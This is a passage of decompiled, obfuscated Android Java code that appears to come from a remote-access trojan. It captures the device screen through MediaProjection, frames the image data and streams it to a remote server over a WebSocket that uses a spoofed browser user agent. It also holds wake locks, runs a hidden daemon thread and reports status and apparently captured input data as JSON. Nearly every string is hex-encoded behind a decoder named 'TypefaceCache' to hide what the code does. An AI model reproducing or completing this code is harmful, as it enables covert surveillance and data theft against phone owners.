                if (this.euF5Udt5Rqv3Qmea > 0 && this.A1BaTVAMeIXMnh >= 3) {
                    this.euF5Udt5Rqv3Qmea--;
                    ManagerUMController.l1V0lQr6TbwNKqHfXNbb = D5P1xCAyuvgF()[this.euF5Udt5Rqv3Qmea];
                    this.A1BaTVAMeIXMnh = 0;
                    TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                    String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                    TypefaceCache.obtain("006F00360049008200E300B000DE00B20037007F0054008900B0008A00E200E7006E0028001B");
                    TypefaceCache.obtain("0063003E004F008E00F500AD0092");
                    this.hV4VTKNUdeHN = jCurrentTimeMillis;
                } else if (d > 14.0d && this.k84rwRrqzhrNQ1CdNQ9 == 0) {
                    if (this.tne6mXOUFKdd < this.ECwLkmPW1UKz7J6E) {
                        int i6 = this.tne6mXOUFKdd + 5;
                        int i7 = this.ECwLkmPW1UKz7J6E;
                        if (i6 > i7) {
                            i6 = i7;
                        }
                        this.tne6mXOUFKdd = i6;
                        ManagerUMController.XuO9PPFo607ssKwZjNW = this.tne6mXOUFKdd;
                        TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                        String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                        TypefaceCache.obtain("006F0036004A009200F100B300DB00B3003A0036001600D900B0");
                    }
                    this.hV4VTKNUdeHN = jCurrentTimeMillis;
                }
                this.VEkRsTDS6a9oHWI = this.tne6mXOUFKdd;
                this.jdOQeRk37T35X5xKW1P = this.fivkjwgu2UdAtiY;
            } else {
                this.A1BaTVAMeIXMnh = 0;
                this.k84rwRrqzhrNQ1CdNQ9 = 0;
            }
            dTS0S7eC32ubQH54j36(d);
        }
    }

    public final void H9XlUr4OeMJFiXK(JSONObject jSONObject) {
        try {
            String string = jSONObject.toString();
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(Looper.myLooper(), Looper.getMainLooper())) {
                this.J0zjQ7CAgohuxU20eCW6.execute(new m7Tosu6RfY5Ca6(this, string, 3));
                return;
            }
            try {
                J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
                if (j1m0XraSkScfWFMIlTC != null ? j1m0XraSkScfWFMIlTC.b1EoSIRjJHO5(string) : false) {
                    return;
                }
                TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048008200FE00BB009200AA002600650048008600F700BA");
            } catch (Exception e) {
                TypefaceCache.obtain("001000730055008300B000BA00C000B5002C0064000100C7");
                e.getMessage();
            }
        } catch (Exception e2) {
            TypefaceCache.obtain("00090045007400A900B000AC00D700B5002A00770057008E00EA00BA009200A2003100640054009500AA00FF");
            e2.getMessage();
        }
    }

    public final void J0zjQ7CAgohuxU20eCW6(byte[] bArr, int i, int i2) {
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
        if (j1m0XraSkScfWFMIlTC == null) {
            TypefaceCache.obtain("000B0040007500A400B000AC00D700A90027002C001B009000E300E200DC00B2002F007A");
            return;
        }
        if (!this.xDyLpEZyrcKVe0) {
            TypefaceCache.obtain("000B0040007500A400B000AC00D700A90027002C001B008900FF00AB009200A4002C00780055008200F300AB00D700A3");
            return;
        }
        try {
            ByteBuffer byteBufferAllocate = ByteBuffer.allocate(17);
            byteBufferAllocate.order(ByteOrder.BIG_ENDIAN);
            byteBufferAllocate.put((byte) 48);
            byteBufferAllocate.putInt(i).putInt(i2).putInt(i).putInt(i2);
            byte[] bArr2 = new byte[bArr.length + 17];
            System.arraycopy(byteBufferAllocate.array(), 0, bArr2, 0, 17);
            System.arraycopy(bArr, 0, bArr2, 17, bArr.length);
            j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW(2, fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr2));
            this.KV57Z6oavcB595B8Dy8Z++;
            if (this.KV57Z6oavcB595B8Dy8Z > 10 && this.KV57Z6oavcB595B8Dy8Z % 30 != 0) {
                return;
            }
            TypefaceCache.obtain("000B0040007500A400B000AF00D900B300630035");
            TypefaceCache.obtain("007900360048008200FE00AB008F");
            TypefaceCache.obtain("006300650052009D00F500E2");
        } catch (Exception e) {
            TypefaceCache.obtain("000B0040007500A400B000AC00D700A900270036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public final void JXn4Qf7zpnLjP5() {
        if (this.JW3Lh9hxwLsO2ArTlH == null) {
            this.JW3Lh9hxwLsO2ArTlH = ((PowerManager) this.dDIMxZXP1V8HdM.getSystemService("power")).newWakeLock(1, TypefaceCache.obtain("00150078005800B000F500BD00E100A80020007D005E009300AA008C00C600B500260077005600B000F100B400D7008B002C00750050"));
        }
        PowerManager.WakeLock wakeLock = this.JW3Lh9hxwLsO2ArTlH;
        if (wakeLock == null || !wakeLock.isHeld()) {
            PowerManager.WakeLock wakeLock2 = this.JW3Lh9hxwLsO2ArTlH;
            if (wakeLock2 != null) {
                wakeLock2.acquire(1800000L);
            }
            TypefaceCache.obtain("001400770050008200DC00B000D100AC006300770058009600E500B600C000A200270036005D008800E200FF00C100B300310073005A008A00F900B100D5");
        }
    }

    public final void K7eEOBPYP9VIoHWTe() {
        if (this.fxMPJzvjKAjA) {
            return;
        }
        try {
            this.fxMPJzvjKAjA = true;
            DataQFAdapter.Companion.getClass();
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            int i = (-24) + 29;
            if (dataQFAdapter == null) {
                this.K5l5kmuyJzrgUX++;
                if (this.K5l5kmuyJzrgUX >= i && !this.SZMVQHSLEmk3KzoEzyls) {
                    this.SZMVQHSLEmk3KzoEzyls = true;
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9008000C700A900220060005A008E00FC00BE00D000AB0026"));
                    jSONObject.put(TypefaceCache.obtain("00310073005A009400FF00B1"), TypefaceCache.obtain("003000730049009100F900BC00D7009800270073005A0083"));
                    H9XlUr4OeMJFiXK(jSONObject);
                    TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E900FF00C700A900220060005A008E00FC00BE00D000AB0026003A001B009400F500AD00C400AE00200073001B008300F500BE00D6");
                }
                return;
            }
            byte[] bArrD5P1xCAyuvgF = LenE2UvkH3tvBN.D5P1xCAyuvgF(dataQFAdapter, dataQFAdapter.getApplicationContext());
            if (bArrD5P1xCAyuvgF == null) {
                this.K5l5kmuyJzrgUX++;
                if (this.K5l5kmuyJzrgUX >= i && !this.SZMVQHSLEmk3KzoEzyls) {
                    this.SZMVQHSLEmk3KzoEzyls = true;
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9008000C700A900220060005A008E00FC00BE00D000AB0026"));
                    jSONObject2.put(TypefaceCache.obtain("00310073005A009400FF00B1"), TypefaceCache.obtain("002D00790064009500FF00B000C600980034007F0055008300FF00A8"));
                    H9XlUr4OeMJFiXK(jSONObject2);
                    TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E900FF00C700A900220060005A008E00FC00BE00D000AB0026003A001B009500F500B100D600A2003100360049008200E400AA00C000A900260072001B008900E500B300DE");
                }
                return;
            }
            this.K5l5kmuyJzrgUX = 0;
            if (this.SZMVQHSLEmk3KzoEzyls) {
                this.SZMVQHSLEmk3KzoEzyls = false;
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9008000C000A2003000620054009500F500BB"));
                H9XlUr4OeMJFiXK(jSONObject3);
            }
            int iHashCode = Arrays.hashCode(bArrD5P1xCAyuvgF);
            if (iHashCode == this.SggvLZZelD4B3v) {
                this.PPWVWMPAUcr9AGNUSxQ++;
            } else {
                this.SggvLZZelD4B3v = iHashCode;
                this.PPWVWMPAUcr9AGNUSxQ = 0;
            }
            nQilHWaqS401ZtR(bArrD5P1xCAyuvgF);
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300C300B400D700AB002600620054008900B000BA00C000B5002C0064000100C7");
            e.getMessage();
        } finally {
            this.fxMPJzvjKAjA = false;
        }
    }

    public final void MLSIo1htfMPWeB8V876L() {
        try {
            JSONArray jSONArrayJ0zjQ7CAgohuxU20eCW6 = DataQFAdapter.Companion.J0zjQ7CAgohuxU20eCW6();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002800730042008B00FF00B800C1"));
            jSONObject.put(TypefaceCache.obtain("00270077004F0086"), jSONArrayJ0zjQ7CAgohuxU20eCW6);
            jSONObject.put(TypefaceCache.obtain("00200079004E008900E4"), jSONArrayJ0zjQ7CAgohuxU20eCW6.length());
            H9XlUr4OeMJFiXK(jSONObject);
            TypefaceCache.obtain("001000730055009300B0");
            jSONArrayJ0zjQ7CAgohuxU20eCW6.length();
            TypefaceCache.obtain("0063007D005E009E00FC00B000D500E700260078004F009500F900BA00C1");
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300DB00BA00CB00AB002C0071004800C700F500AD00C000A80031002C001B");
            e.getMessage();
        }
    }

    public final boolean MSGkxvPxRYNqC(long j) throws JSONException {
        long jCurrentTimeMillis = System.currentTimeMillis();
        while (System.currentTimeMillis() - jCurrentTimeMillis < j) {
            String str = ManagerUMController.DVTNwpDEVsUKuznof;
            if (ManagerUMController.ECwLkmPW1UKz7J6E && ManagerUMController.fivkjwgu2UdAtiY != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003300640054008D00F500BC00C600AE002C00780064009400E400BE00C600B20030", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00300062005A009500E400BA00D6"));
                H9XlUr4OeMJFiXK(jSONObject);
                return true;
            }
            try {
                Thread.sleep(250L);
            } catch (InterruptedException unused) {
                return false;
            }
        }
        TypefaceCache.obtain("003400770052009300D600B000C0008400220066004F009200E200BA009200B3002A007B005E008300B000B000C700B300630077005D009300F500AD0092");
        return false;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v2, types: [boolean, int] */
    public final void O2DHNSIGZlgPja7eqLgn() {
        if (this.OYRwk007Mtyi) {
            return;
        }
        ?? r0 = 70 - 69;
        this.OYRwk007Mtyi = r0;
        TypefaceCache.obtain("007D0028000500C700C300AB00D300B50037007F0055008000B0009700E40089000000360050008200F500AF00D300AB002A0060005E00C700FC00B000DD00B70063002A000700DB");
        Thread thread = new Thread(new uY2iPU7ne5s7Y5LeXnLI(this, 10), TypefaceCache.obtain("002B00600055008400BD00B400D700A2003300770057008E00E600BA"));
        this.uW0IRoPBZMj2QmBkkp = thread;
        thread.setDaemon(r0);
        Thread thread2 = this.uW0IRoPBZMj2QmBkkp;
        if (thread2 != null) {
            thread2.start();
        }
    }

    public final void Qrz92kRPw4GcghAc() {
        if (this.ibVTtJUNfrGYbW) {
            long jPyu8ovAipBTLYAiKab = pyu8ovAipBTLYAiKab();
            TypefaceCache.obtain("001000750053008200F400AA00DE00AE002D0071001B009500F500BC00DD00A9002D00730058009300B000B600DC00E7");
            TypefaceCache.obtain("002E0065001B00CF00F100AB00C600A2002E0066004F00C7");
            this.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(this, 0), jPyu8ovAipBTLYAiKab);
        }
    }

    public final void XiR1pIn5878vVWd(NxAMaDFbSCxW6M03f nxAMaDFbSCxW6M03f) {
        try {
            JSONObject jSONObjectDDIMxZXP1V8HdM = nxAMaDFbSCxW6M03f.dDIMxZXP1V8HdM();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002F007F004D008200CF00B400D700BE002F0079005C"));
            jSONObject.put(TypefaceCache.obtain("00260078004F009500E9008000C600BE00330073"), jSONObjectDDIMxZXP1V8HdM.optString(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002800730042008B00FF00B8")));
            Iterator<String> itKeys = jSONObjectDDIMxZXP1V8HdM.keys();
            while (itKeys.hasNext()) {
                String next = itKeys.next();
                if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(next, TypefaceCache.obtain("0037006F004B0082"))) {
                    jSONObject.put(next, jSONObjectDDIMxZXP1V8HdM.get(next));
                }
            }
            H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300DC00B600C400A2000800730042008B00FF00B8009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }

    public final void XuO9PPFo607ssKwZjNW() {
        this.Qrz92kRPw4GcghAc = false;
        Timer timer = this.wotphlvK9sPbXJ;
        if (timer != null) {
            timer.cancel();
        }
        this.wotphlvK9sPbXJ = null;
        TypefaceCache.obtain("00070073004D008E00F300BA009200AA002600620049008E00F300AC009200B5002600660054009500E400B600DC00A000630065004F008800E000AF00D700A3");
    }

    public final void b1EoSIRjJHO5() {
        String str;
        String str2;
        if (this.b1EoSIRjJHO5.length() != 0 && this.xDyLpEZyrcKVe0) {
            try {
                J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.JXn4Qf7zpnLjP5;
                if (j1m0XraSkScfWFMIlTC != null) {
                    j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("003100730058008800FE00B100D700A40037003B0048008400E200BA00D700A9"), 1000);
                }
            } catch (Exception unused) {
            }
            while (System.nanoTime() < 0) {
                StringBuilder sb = new StringBuilder();
                sb.append(0);
                sb.setLength(0);
            }
            this.Ee8d2j4S9Vm5yGuR = false;
            if (this.b1EoSIRjJHO5.endsWith("/")) {
                str = this.b1EoSIRjJHO5;
                str2 = "003000750049008200F500B1";
            } else {
                str = this.b1EoSIRjJHO5;
                str2 = "006C00650058009500F500BA00DC";
            }
            String strIbVTtJUNfrGYbW = Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(str, TypefaceCache.obtain(str2));
            TypefaceCache.obtain("000C0066005E008900F900B100D500E7003000750049008200F500B1009200A4002B00770055008900F500B3008800E7");
            ThreadLocalRandom threadLocalRandomCurrent = ThreadLocalRandom.current();
            Vb7X6LE0p9sZh vb7X6LE0p9sZhDDIMxZXP1V8HdM = ((sp6apkX00TawY02qGY6r) PKzJf7Iq6ie0OaUSZLp.dDIMxZXP1V8HdM()).dDIMxZXP1V8HdM();
            TimeUnit timeUnit = TimeUnit.SECONDS;
            vb7X6LE0p9sZhDDIMxZXP1V8HdM.EWUjsTERgdPbSw3NNlN = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("interval", 25L, timeUnit);
            vb7X6LE0p9sZhDDIMxZXP1V8HdM.l1V0lQr6TbwNKqHfXNbb = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 12L, timeUnit);
            vb7X6LE0p9sZhDDIMxZXP1V8HdM.dTS0S7eC32ubQH54j36 = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 15L, timeUnit);
            vb7X6LE0p9sZhDDIMxZXP1V8HdM.K7eEOBPYP9VIoHWTe = yrMnf4fyLGfIJbMg8IbG.w9sT1Swbhx3hs("timeout", 0L, TimeUnit.MILLISECONDS);
            sp6apkX00TawY02qGY6r sp6apkx00tawy02qgy6r = new sp6apkX00TawY02qGY6r(vb7X6LE0p9sZhDDIMxZXP1V8HdM);
            fUH025aw0Rgl fuh025aw0rgl = new fUH025aw0Rgl(2);
            fuh025aw0rgl.D5P1xCAyuvgF(strIbVTtJUNfrGYbW);
            String strObtain = TypefaceCache.obtain("00160065005E009500BD009E00D500A2002D0062");
            String strObtain2 = TypefaceCache.obtain("000E00790041008E00FC00B300D300E800760038000B00C700B8009300DB00A90036006E000000C700D100B100D600B5002C007F005F00C7");
            String str3 = Build.VERSION.RELEASE;
            String str4 = Build.MODEL;
            String strObtain3 = TypefaceCache.obtain("006A0036007A009700E000B300D70090002600740070008E00E400F0008700F400740038000800D100B000F700F9008F0017005B007700CB00B000B300DB00AC00260036007C008200F300B400DD00EE006300550053009500FF00B200D700E8");
            String[] strArr = UE6365QWSHVg5Fff;
            String str5 = strArr[threadLocalRandomCurrent.nextInt(strArr.length)];
            String strObtain4 = TypefaceCache.obtain("0063005B0054008500F900B300D700E700100077005D008600E200B6009D00F200700021001500D400A6");
            StringBuilder sb2 = new StringBuilder();
            sb2.append(strObtain2);
            sb2.append(str3);
            sb2.append("; ");
            sb2.append(str4);
            sb2.append(strObtain3);
            ((r5XEUfod5GSCCwq6c) fuh025aw0rgl.vekpFI4d1Nc4fakF).yTljMGnIibTRdOpSh4(strObtain, Y9mRyRdkl5FOcwb66V6.D5P1xCAyuvgF(sb2, str5, strObtain4));
            this.JXn4Qf7zpnLjP5 = sp6apkx00tawy02qgy6r.w9sT1Swbhx3hs(fuh025aw0rgl.dDIMxZXP1V8HdM(), new XxXBSmiig14HgdAKPhi8(1, this));
        }
    }

    public final void dTS0S7eC32ubQH54j36(double d) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000620049008200F100B200ED00B400370077004F0094"));
            jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00A100330065"), String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1)));
            jSONObject.put(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), this.tne6mXOUFKdd);
            jSONObject.put(TypefaceCache.obtain("00200079005F008200F3"), this.fivkjwgu2UdAtiY);
            jSONObject.put(TypefaceCache.obtain("00310062004F00B800FD00AC"), this.vIJudZvPyTuNp);
            jSONObject.put(TypefaceCache.obtain("002E0077004300B800F900B100ED00A1002F007F005C008F00E4"), this.DVTNwpDEVsUKuznof);
            jSONObject.put(TypefaceCache.obtain("00300062005A009300F900BC00ED00A5002C007900480093"), this.MSGkxvPxRYNqC);
            jSONObject.put(TypefaceCache.obtain("003100730048008800FC00AA00C600AE002C0078"), this.euF5Udt5Rqv3Qmea < D5P1xCAyuvgF().length ? D5P1xCAyuvgF()[this.euF5Udt5Rqv3Qmea] : 0);
            jSONObject.put(TypefaceCache.obtain("003100730048008800FC00AA00C600AE002C00780064009300F900BA00C0"), this.euF5Udt5Rqv3Qmea);
            H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Code duplicated, block: B:100:0x01b6 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:28:0x007a  */
    /* JADX WARN: Code duplicated, block: B:29:0x007e  */
    /* JADX WARN: Code duplicated, block: B:31:0x0082  */
    /* JADX WARN: Code duplicated, block: B:34:0x00ae  */
    /* JADX WARN: Code duplicated, block: B:38:0x00ba A[Catch: all -> 0x00be, Exception -> 0x00c2, TryCatch #2 {Exception -> 0x00c2, blocks: (B:36:0x00b6, B:38:0x00ba, B:43:0x00c6, B:45:0x00cc, B:46:0x00cf, B:48:0x00d3, B:49:0x00d6), top: B:91:0x00b6, outer: #3 }] */
    /* JADX WARN: Code duplicated, block: B:45:0x00cc A[Catch: all -> 0x00be, Exception -> 0x00c2, TryCatch #2 {Exception -> 0x00c2, blocks: (B:36:0x00b6, B:38:0x00ba, B:43:0x00c6, B:45:0x00cc, B:46:0x00cf, B:48:0x00d3, B:49:0x00d6), top: B:91:0x00b6, outer: #3 }] */
    /* JADX WARN: Code duplicated, block: B:48:0x00d3 A[Catch: all -> 0x00be, Exception -> 0x00c2, TryCatch #2 {Exception -> 0x00c2, blocks: (B:36:0x00b6, B:38:0x00ba, B:43:0x00c6, B:45:0x00cc, B:46:0x00cf, B:48:0x00d3, B:49:0x00d6), top: B:91:0x00b6, outer: #3 }] */
    /* JADX WARN: Code duplicated, block: B:56:0x00ff A[Catch: Exception -> 0x013a, TRY_LEAVE, TryCatch #0 {Exception -> 0x013a, blocks: (B:54:0x00ea, B:56:0x00ff, B:66:0x013d), top: B:87:0x00ea }] */
    /* JADX WARN: Code duplicated, block: B:59:0x0109  */
    /* JADX WARN: Code duplicated, block: B:63:0x0134 A[LOOP:1: B:58:0x0107->B:63:0x0134, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:66:0x013d A[Catch: Exception -> 0x013a, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x013a, blocks: (B:54:0x00ea, B:56:0x00ff, B:66:0x013d), top: B:87:0x00ea }] */
    /* JADX WARN: Code duplicated, block: B:76:0x01ab A[Catch: Exception -> 0x01e1, TryCatch #4 {Exception -> 0x01e1, blocks: (B:73:0x0182, B:76:0x01ab, B:78:0x01b6), top: B:94:0x0182 }] */
    /* JADX WARN: Code duplicated, block: B:82:0x01e6 A[LOOP:2: B:74:0x01a6->B:82:0x01e6, LOOP_END] */
    /* JADX WARN: Code duplicated, block: B:91:0x00b6 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:98:0x0114 A[SYNTHETIC] */
    public final boolean euF5Udt5Rqv3Qmea(int i) throws JSONException, InterruptedException {
        ManagerUMController managerUMController;
        MediaProjection mediaProjection;
        boolean z;
        int i2;
        MediaProjection mediaProjection2;
        x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp;
        int i3;
        VirtualDisplay virtualDisplay;
        ImageReader imageReader;
        ImageReader imageReader2;
        x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp2 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
        if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj != null) {
            TypefaceCache.obtain("000B0040007500A400B000BE00DE00B500260077005F009E00B000AD00C700A9002D007F00550080");
            return true;
        }
        int iXDyLpEZyrcKVe0 = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(i, 240, 720);
        String str = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
        if (!jb8et6SZeK5TWMrJFxDX.gmNWMfvn6zlEj() || Build.VERSION.SDK_INT >= 34) {
            String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
            managerUMController = ManagerUMController.fivkjwgu2UdAtiY;
            if (managerUMController != null) {
                mediaProjection = managerUMController.dDIMxZXP1V8HdM;
            } else {
                mediaProjection = null;
            }
            if (mediaProjection != null) {
                TypefaceCache.obtain("001000610052009300F300B700DB00A9002400360057008E00E600BA0092008A00220078005A008000F500AD00E7008A000000790055009300E200B000DE00AB00260064001B008100E200B000DF00E700090046007E00A000B000AB00DD00E7000B0040007500A4");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("003000610052009300F300B700DB00A900240049004F008800CF00B7008000F10077"));
                H9XlUr4OeMJFiXK(jSONObject);
                mediaProjection2 = managerUMController.dDIMxZXP1V8HdM;
                if (mediaProjection2 != null) {
                    TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400AA00FF00C000A2003600650052008900F700FF00DE00AE00350073001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008100FF00AD0092008F006D0024000D00D3");
                    synchronized (managerUMController.gIIiyi2ddlMDR0) {
                        try {
                            try {
                                virtualDisplay = managerUMController.w9sT1Swbhx3hs;
                                if (virtualDisplay != null) {
                                    virtualDisplay.release();
                                }
                                managerUMController.w9sT1Swbhx3hs = null;
                                imageReader = managerUMController.vekpFI4d1Nc4fakF;
                                if (imageReader != null) {
                                    imageReader.setOnImageAvailableListener(null, null);
                                }
                                imageReader2 = managerUMController.vekpFI4d1Nc4fakF;
                                if (imageReader2 != null) {
                                    imageReader2.close();
                                }
                                managerUMController.vekpFI4d1Nc4fakF = null;
                                managerUMController.b1EoSIRjJHO5();
                            } catch (Exception e) {
                                TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B000BC00DE00A200220078004E009700B000BA00C000B5002C0064000100C7");
                                e.getMessage();
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                    ManagerUMController.iUQk66nAiXgO35.set(null);
                    try {
                        x1g2i7kvsdxo3fp = new x1G2i7KvSdxo3fp(mediaProjection2, managerUMController.b1EoSIRjJHO5, managerUMController.pyu8ovAipBTLYAiKab, managerUMController.D5P1xCAyuvgF);
                        if (x1g2i7kvsdxo3fp.vekpFI4d1Nc4fakF(iXDyLpEZyrcKVe0, 800000)) {
                            managerUMController.JXn4Qf7zpnLjP5 = x1g2i7kvsdxo3fp;
                            TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B0009000F900FD0063");
                            for (i3 = 1; i3 < 16; i3++) {
                                Thread.sleep(200L);
                                x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp3 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                                if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj != null) {
                                    JSONObject jSONObject2 = new JSONObject();
                                    jSONObject2.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject2, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00300062005A009500E400BA00D6"));
                                    H9XlUr4OeMJFiXK(jSONObject2);
                                    return true;
                                }
                            }
                        } else {
                            TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400AA00FF00F100A60020007E005E00AB00D7008800DD00B500280073004900C900E300AB00D300B50037003E001200C700F600BE00DB00AB00260072");
                        }
                    } catch (Exception e2) {
                        TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B000BA00C000B5002C0064000100C7");
                        e2.getMessage();
                    }
                }
                TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B000B900D300AE002F0073005F00CB00B000B900D300AB002F007F0055008000B000AB00DA00B5002C0063005C008F00B000AB00DD00E7003300730049008A00F900AC00C100AE002C0078001B009500F500AE00C700A200300062");
            }
            TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008100FF00AD0092008F00150058007800C700B800BE00C700B3002C00550057008E00F300B400920088000D003F");
            JSONObject jSONObject3 = new JSONObject();
            jSONObject3.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject3, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00310073004A009200F500AC00C600AE002D00710064009700F500AD00DF00AE003000650052008800FE"));
            H9XlUr4OeMJFiXK(jSONObject3);
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            z = VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0;
            VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = true;
            try {
                String str3 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                Intent intentD5P1xCAyuvgF = jb8et6SZeK5TWMrJFxDX.D5P1xCAyuvgF(this.dDIMxZXP1V8HdM, 50);
                intentD5P1xCAyuvgF.putExtra(TypefaceCache.obtain("002B00600055008400CF00B200DD00A30026"), true);
                intentD5P1xCAyuvgF.putExtra(TypefaceCache.obtain("003700770049008000F500AB00ED00B0002A0072004F008F"), iXDyLpEZyrcKVe0);
                this.dDIMxZXP1V8HdM.startActivity(intentD5P1xCAyuvgF);
                for (i2 = 1; i2 < 41; i2++) {
                    Thread.sleep(250L);
                    x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp4 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                    if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj != null) {
                        VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ6 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                        VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = z;
                        JSONObject jSONObject4 = new JSONObject();
                        jSONObject4.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002B00600055008400CF00AC00C600A6003700630048"));
                        jSONObject4.put(TypefaceCache.obtain("00300062005A009300E500AC"), TypefaceCache.obtain("00300062005A009500E400BA00D6"));
                        H9XlUr4OeMJFiXK(jSONObject4);
                    }
                }
            } catch (Exception e3) {
                TypefaceCache.obtain("000B0040007500A400B000AF00D700B5002E007F0048009400F900B000DC00E700310073004A009200F500AC00C600E7002500770052008B00F500BB008800E7");
                e3.getMessage();
            }
            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ7 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
            VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = z;
            JSONObject jSONObject5 = new JSONObject();
            jSONObject5.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject5, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("002500770057008B00F200BE00D100AC001C00770058008400F500AC00C100AE0021007F0057008E00E400A6"));
            H9XlUr4OeMJFiXK(jSONObject5);
            return false;
        }
